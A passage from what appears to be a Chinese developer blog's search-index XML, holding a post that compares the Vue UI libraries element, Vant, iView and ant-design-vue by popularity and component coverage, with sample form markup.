        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>UI组件库总结</title>
    <url>/2020/04/03/UI%E7%BB%84%E4%BB%B6%E5%BA%93%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;之前由于有开发自己的组件库的需求，于是自己去了解和学习了一下比较成熟的一些框架。主要从各自的优缺点、组件功能整理、以及对于其实现的学习等方面进行总结。<br><a id="more"></a></p>
<h3 id="各类组件的优缺点调研"><a href="#各类组件的优缺点调研" class="headerlink" title="各类组件的优缺点调研"></a>各类组件的优缺点调研</h3><blockquote>
<p>这里主要是调研elementUI、Vant、ant-design-vue、iView。对比其使用率、组件库丰富度、API风格、项目优化等进行比较。</p>
</blockquote>
<h4 id="使用率"><a href="#使用率" class="headerlink" title="使用率"></a>使用率</h4><blockquote>
<p>这里主要是根据star数、npm 平均下载频率等进行对比</p>
</blockquote>
<table>
<thead>
<tr>
<th style="text-align:center">组件库</th>
<th style="text-align:center">star数</th>
<th style="text-align:center">npm下载数(week)</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">element</td>
<td style="text-align:center">43.7k</td>
<td style="text-align:center">155,520</td>
</tr>
<tr>
<td style="text-align:center">vant</td>
<td style="text-align:center">12.6k</td>
<td style="text-align:center">12,428</td>
</tr>
<tr>
<td style="text-align:center">iView</td>
<td style="text-align:center">1.1k</td>
<td style="text-align:center">12,930</td>
</tr>
<tr>
<td style="text-align:center">ant-design-vue</td>
<td style="text-align:center">9.3k</td>
<td style="text-align:center">20,089</td>
</tr>
</tbody>
</table>
<blockquote>
<p>下面是其他的一些信息对比</p>
</blockquote>
<p><img src="/images/element.png" alt="Image"><br><img src="/images/vant.png" alt="Image"><br><img src="/images/iview.png" alt="Image"><br><img src="/images/ant.png" alt="Image"></p>
<blockquote>
<p>数据差异也和发布时间，以及库是否发生过迁移有关。总体来说elementUi的star数、npm下载数、开发者团队等都是最多的，同时issue和bug也是最多的（由于使用的人数比较多）。除此之外，element也提供了一些额外的功能，其中包含了自定义主题设置以及对设计比较友好的Axure Components和Sketch Template。</p>
</blockquote>
<h4 id="组件库丰富度"><a href="#组件库丰富度" class="headerlink" title="组件库丰富度"></a>组件库丰富度</h4><blockquote>
<p>随着版本库的不断迭代，各个组件库之间功能上的差异也是越来越小了，基本上所包含的组件种类都大同小异，针对不同注重的方向会有一部分特定组件的编写，只是一些组件的使用上会有一定的区别。主要包含的组件如下：</p>
</blockquote>
<table>
<thead>
<tr>
<th style="text-align:center">组件</th>
<th style="text-align:center">element</th>
<th style="text-align:center">vant</th>
<th style="text-align:center">iView</th>
<th style="text-align:center">ant-design-vue</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">国际化</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">自定义主题</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">内置过渡动画</td>
<td style="text-align:center">√</td>
<td style="text-align:center">X</td>
<td style="text-align:center">X</td>
</tr>
<tr>
<td style="text-align:center">Layout</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">contaner</td>
<td style="text-align:center">√</td>
<td style="text-align:center">X</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">单元格</td>
<td style="text-align:center">X</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">X</td>
</tr>
<tr>
<td style="text-align:center">color</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">字体</td>
<td style="text-align:center">√</td>
<td style="text-align:center">X</td>
<td style="text-align:center">√</td>
<td style="text-align:center">X</td>
</tr>
<tr>
<td style="text-align:center">border</td>
<td style="text-align:center">√</td>
<td style="text-align:center">X</td>
<td style="text-align:center">X</td>
<td style="text-align:center">X</td>
</tr>
<tr>
<td style="text-align:center">Icon</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">Button</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">Link</td>
<td style="text-align:center">√</td>
<td style="text-align:center">X</td>
<td style="text-align:center">X</td>
<td style="text-align:center">X</td>
</tr>
<tr>
<td style="text-align:center">Radio</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">checkBox</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">Input</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">InputNumber 计数器</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">密码输入框</td>
<td style="text-align:center">X</td>
<td style="text-align:center">√</td>
<td style="text-align:center">X</td>
<td style="text-align:center">X</td>
</tr>
<tr>
<td style="text-align:center">搜索框</td>
<td style="text-align:center">X</td>
<td style="text-align:center">√</td>
<td style="text-align:center">X</td>
<td style="text-align:center">X</td>
</tr>
<tr>
<td style="text-align:center">Select</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">级联选择器</td>
<td style="text-align:center">√</td>
<td style="text-align:center">X</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">Switch 开关</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">Slider 滑块</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">时间选择器</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">日期选择器</td>
<td style="text-align:center">√</td>
<td style="text-align:center">X</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">日期时间选择器</td>
<td style="text-align:center">√</td>
<td style="text-align:center">X</td>
<td style="text-align:center">X</td>
<td style="text-align:center">X</td>
</tr>
<tr>
<td style="text-align:center">Upload 上传</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">Rate 评分</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">ColorPick 颜色选择器</td>
<td style="text-align:center">√</td>
<td style="text-align:center">X</td>
<td style="text-align:center">√</td>
<td style="text-align:center">X</td>
</tr>
<tr>
<td style="text-align:center">Transfer 穿梭框</td>
<td style="text-align:center">√</td>
<td style="text-align:center">X</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">Form 表单</td>
<td style="text-align:center">√</td>
<td style="text-align:center">X</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">Table</td>
<td style="text-align:center">√</td>
<td style="text-align:center">X</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">Tag 标签</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">progress 进度条</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">Tree 树型控件</td>
<td style="text-align:center">√</td>
<td style="text-align:center">X</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">分页</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">标记</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">锚点</td>
<td style="text-align:center">X</td>
<td style="text-align:center">X</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">头像</td>
<td style="text-align:center">√</td>
<td style="text-align:center">X</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">Alert 警告</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">Loading 加载</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">Message 消息提醒</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">弹框</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">X</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">通知</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">导航菜单</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">标签页</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">面包屑</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">页头</td>
<td style="text-align:center">√</td>
<td style="text-align:center">X</td>
<td style="text-align:center">X</td>
<td style="text-align:center">X</td>
</tr>
<tr>
<td style="text-align:center">下拉菜单</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">上拉菜单</td>
<td style="text-align:center">X</td>
<td style="text-align:center">√</td>
<td style="text-align:center">X</td>
<td style="text-align:center">X</td>
</tr>
<tr>
<td style="text-align:center">遮罩层</td>
<td style="text-align:center">X</td>
<td style="text-align:center">√</td>
<td style="text-align:center">X</td>
<td style="text-align:center">X</td>
</tr>
<tr>
<td style="text-align:center">下拉刷新</td>
<td style="text-align:center">X</td>
<td style="text-align:center">√</td>
<td style="text-align:center">X</td>
<td style="text-align:center">X</td>
</tr>
<tr>
<td style="text-align:center">滑动单元格</td>
<td style="text-align:center">X</td>
<td style="text-align:center">√</td>
<td style="text-align:center">X</td>
<td style="text-align:center">X</td>
</tr>
<tr>
<td style="text-align:center">进度条</td>
<td style="text-align:center">X</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">倒计时</td>
<td style="text-align:center">X</td>
<td style="text-align:center">√</td>
<td style="text-align:center">X</td>
<td style="text-align:center">X</td>
</tr>
<tr>
<td style="text-align:center">步骤条</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">对话框</td>
<td style="text-align:center">√</td>
<td style="text-align:center">X</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">文字提示</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">弹出框</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">气泡确认框</td>
<td style="text-align:center">√</td>
<td style="text-align:center">X</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">卡片</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">走马灯</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">折叠面板</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">评论</td>
<td style="text-align:center">X</td>
<td style="text-align:center">X</td>
<td style="text-align:center">X</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">空状态</td>
<td style="text-align:center">X</td>
<td style="text-align:center">X</td>
<td style="text-align:center">X</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">骨架屏</td>
<td style="text-align:center">X</td>
<td style="text-align:center">√</td>
<td style="text-align:center">X</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">统计数值</td>
<td style="text-align:center">X</td>
<td style="text-align:center">X</td>
<td style="text-align:center">X</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">面板分割</td>
<td style="text-align:center">X</td>
<td style="text-align:center">X</td>
<td style="text-align:center">√</td>
<td style="text-align:center">X</td>
</tr>
<tr>
<td style="text-align:center">时间线</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">相对时间</td>
<td style="text-align:center">X</td>
<td style="text-align:center">X</td>
<td style="text-align:center">√</td>
<td style="text-align:center">X</td>
</tr>
<tr>
<td style="text-align:center">分割线</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">日历</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">X</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">图片</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">X</td>
<td style="text-align:center">X</td>
</tr>
<tr>
<td style="text-align:center">图片懒加载</td>
<td style="text-align:center">X</td>
<td style="text-align:center">√</td>
<td style="text-align:center">X</td>
<td style="text-align:center">X</td>
</tr>
<tr>
<td style="text-align:center">回到顶部</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">无限滚动</td>
<td style="text-align:center">√</td>
<td style="text-align:center">X</td>
<td style="text-align:center">√</td>
<td style="text-align:center">X</td>
</tr>
<tr>
<td style="text-align:center">抽屉</td>
<td style="text-align:center">√</td>
<td style="text-align:center">X</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
</tbody>
</table>
<blockquote>
<p>其中有些功能不同组件库中可能有合并，其中Icon组件所对应的图标，elementUi中提供的比较少。</p>
</blockquote>
<h4 id="API风格"><a href="#API风格" class="headerlink" title="API风格"></a>API风格</h4><blockquote>
<p>API风格主要是通过一些组件的使用，以及渲染方式来进行对比。这里主要是对比form 和 table组件</p>
<ul>
<li>form</li>
</ul>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- element --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">el-form</span> <span class="attr">ref</span>=<span class="string">"form"</span> <span class="attr">:model</span>=<span class="string">"form"</span> <span class="attr">label-width</span>=<span class="string">"80px"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">label</span>=<span class="string">"活动名称"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-input</span> <span class="attr">v-model</span>=<span class="string">"form.name"</span>&gt;</span><span class="tag">&lt;/<span class="name">el-input</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">label</span>=<span class="string">"活动区域"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-select</span> <span class="attr">v-model</span>=<span class="string">"form.region"</span> <span class="attr">placeholder</span>=<span class="string">"请选择活动区域"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-option</span> <span class="attr">label</span>=<span class="string">"区域一"</span> <span class="attr">value</span>=<span class="string">"shanghai"</span>&gt;</span><span class="tag">&lt;/<span class="name">el-option</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-option</span> <span class="attr">label</span>=<span class="string">"区域二"</span> <span class="attr">value</span>=<span class="string">"beijing"</span>&gt;</span><span class="tag">&lt;/<span class="name">el-option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">el-select</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">label</span>=<span class="string">"活动时间"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-col</span> <span class="attr">:span</span>=<span class="string">"11"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-date-picker</span> <span class="attr">type</span>=<span class="string">"date"</span> <span class="attr">placeholder</span>=<span class="string">"选择日期"</span> <span class="attr">v-model</span>=<span class="string">"form.date1"</span> <span class="attr">style</span>=<span class="string">"width: 100%;"</span>&gt;</span><span class="tag">&lt;/<span class="name">el-date-picker</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">el-col</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-col</span> <span class="attr">class</span>=<span class="string">"line"</span> <span class="attr">:span</span>=<span class="string">"2"</span>&gt;</span>-<span class="tag">&lt;/<span class="name">el-col</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-col</span> <span class="attr">:span</span>=<span class="string">"11"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-time-picker</span> <span class="attr">placeholder</span>=<span class="string">"选择时间"</span> <span class="attr">v-model</span>=<span class="string">"form.date2"</span> <span class="attr">style</span>=<span class="string">"width: 100%;"</span>&gt;</span><span class="tag">&lt;/<span class="name">el-time-picker</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">el-col</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">label</span>=<span class="string">"即时配送"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-switch</span> <span class="attr">v-model</span>=<span class="string">"form.delivery"</span>&gt;</span><span class="tag">&lt;/<span class="name">el-switch</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">label</span>=<span class="string">"活动性质"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-checkbox-group</span> <span class="attr">v-model</span>=<span class="string">"form.type"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-checkbox</span> <span class="attr">label</span>=<span class="string">"美食/餐厅线上活动"</span> <span class="attr">name</span>=<span class="string">"type"</span>&gt;</span><span class="tag">&lt;/<span class="name">el-checkbox</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-checkbox</span> <span class="attr">label</span>=<span class="string">"地推活动"</span> <span class="attr">name</span>=<span class="string">"type"</span>&gt;</span><span class="tag">&lt;/<span class="name">el-checkbox</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-checkbox</span> <span class="attr">label</span>=<span class="string">"线下主题活动"</span> <span class="attr">name</span>=<span class="string">"type"</span>&gt;</span><span class="tag">&lt;/<span class="name">el-checkbox</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-checkbox</span> <span class="attr">label</span>=<span class="string">"单纯品牌曝光"</span> <span class="attr">name</span>=<span class="string">"type"</span>&gt;</span><span class="tag">&lt;/<span class="name">el-checkbox</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">el-checkbox-group</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">label</span>=<span class="string">"特殊资源"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-radio-group</span> <span class="attr">v-model</span>=<span class="string">"form.resource"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-radio</span> <span class="attr">label</span>=<span class="string">"线上品牌商赞助"</span>&gt;</span><span class="tag">&lt;/<span class="name">el-radio</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-radio</span> <span class="attr">label</span>=<span class="string">"线下场地免费"</span>&gt;</span><span class="tag">&lt;/<span class="name">el-radio</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">el-radio-group</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">label</span>=<span class="string">"活动形式"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-input</span> <span class="attr">type</span>=<span class="string">"textarea"</span> <span class="attr">v-model</span>=<span class="string">"form.desc"</span>&gt;</span><span class="tag">&lt;/<span class="name">el-input</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">el-form-item</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">"primary"</span> @<span class="attr">click</span>=<span class="string">"onSubmit"</span>&gt;</span>立即创建<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-button</span>&gt;</span>取消<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">el-form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- vant 没有整个的form组件--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- iView --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Form</span> <span class="attr">:model</span>=<span class="string">"formItem"</span> <span class="attr">:label-width</span>=<span class="string">"80"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">FormItem</span> <span class="attr">label</span>=<span class="string">"Input"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Input</span> <span class="attr">v-model</span>=<span class="string">"formItem.input"</span> <span class="attr">placeholder</span>=<span class="string">"Enter something..."</span>&gt;</span><span class="tag">&lt;/<span class="name">Input</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">FormItem</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">FormItem</span> <span class="attr">label</span>=<span class="string">"Select"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Select</span> <span class="attr">v-model</span>=<span class="string">"formItem.select"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Option</span> <span class="attr">value</span>=<span class="string">"beijing"</span>&gt;</span>New York<span class="tag">&lt;/<span class="name">Option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Option</span> <span class="attr">value</span>=<span class="string">"shanghai"</span>&gt;</span>London<span class="tag">&lt;/<span class="name">Option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Option</span> <span class="attr">value</span>=<span class="string">"shenzhen"</span>&gt;</span>Sydney<span class="tag">&lt;/<span class="name">Option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">FormItem</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">FormItem</span> <span class="attr">label</span>=<span class="string">"DatePicker"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Row</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Col</span> <span class="attr">span</span>=<span class="string">"11"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">DatePicker</span> <span class="attr">type</span>=<span class="string">"date"</span> <span class="attr">placeholder</span>=<span class="string">"Select date"</span> <span class="attr">v-model</span>=<span class="string">"formItem.date"</span>&gt;</span><span class="tag">&lt;/<span class="name">DatePicker</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">Col</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Col</span> <span class="attr">span</span>=<span class="string">"2"</span> <span class="attr">style</span>=<span class="string">"text-align: center"</span>&gt;</span>-<span class="tag">&lt;/<span class="name">Col</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Col</span> <span class="attr">span</span>=<span class="string">"11"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">TimePicker</span> <span class="attr">type</span>=<span class="string">"time"</span> <span class="attr">placeholder</span>=<span class="string">"Select time"</span> <span class="attr">v-model</span>=<span class="string">"formItem.time"</span>&gt;</span><span class="tag">&lt;/<span class="name">TimePicker</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">Col</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Row</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">FormItem</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">FormItem</span> <span class="attr">label</span>=<span class="string">"Radio"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">RadioGroup</span> <span class="attr">v-model</span>=<span class="string">"formItem.radio"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Radio</span> <span class="attr">label</span>=<span class="string">"male"</span>&gt;</span>Male<span class="tag">&lt;/<span class="name">Radio</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Radio</span> <span class="attr">label</span>=<span class="string">"female"</span>&gt;</span>Female<span class="tag">&lt;/<span class="name">Radio</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">RadioGroup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">FormItem</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">FormItem</span> <span class="attr">label</span>=<span class="string">"Checkbox"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">CheckboxGroup</span> <span class="attr">v-model</span>=<span class="string">"formItem.checkbox"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Checkbox</span> <span class="attr">label</span>=<span class="string">"Eat"</span>&gt;</span><span class="tag">&lt;/<span class="name">Checkbox</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Checkbox</span> <span class="attr">label</span>=<span class="string">"Sleep"</span>&gt;</span><span class="tag">&lt;/<span class="name">Checkbox</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Checkbox</span> <span class="attr">label</span>=<span class="string">"Run"</span>&gt;</span><span class="tag">&lt;/<span class="name">Checkbox</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Checkbox</span> <span class="attr">label</span>=<span class="string">"Movie"</span>&gt;</span><span class="tag">&lt;/<span class="name">Checkbox</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">CheckboxGroup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">FormItem</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">FormItem</span> <span class="attr">label</span>=<span class="string">"Switch"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">i-switch</span> <span class="attr">v-model</span>=<span class="string">"formItem.switch"</span> <span class="attr">size</span>=<span class="string">"large"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">slot</span>=<span class="string">"open"</span>&gt;</span>On<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span 